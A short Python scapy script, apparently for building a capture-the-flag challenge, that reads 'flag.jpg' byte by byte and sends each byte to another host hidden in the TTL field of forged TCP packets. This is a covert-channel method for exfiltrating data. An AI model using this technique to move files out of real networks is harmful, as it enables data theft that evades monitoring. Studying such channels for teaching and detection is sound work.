from scapy.all import *
import binascii
step = j= 1
f = open ('./flag.jpg','rb')
len_f = len(f.read())
f.seek(0)


byte = f.read(step)
while(byte != ''):
  print str(j*100.0/len_f) + ' %'

  int_byte = int(binascii.hexlify(byte),16)
  sendp(Ether(dst='d4:87:8c:4a:40:a4',src='d4:87:8c:56:40:a4')/IP(src='192.168.1.101',dst='192.168.2.225',ttl=int_byte)/TCP(),iface='wlp3s0')
  byte = f.read(step)
  j = j + step
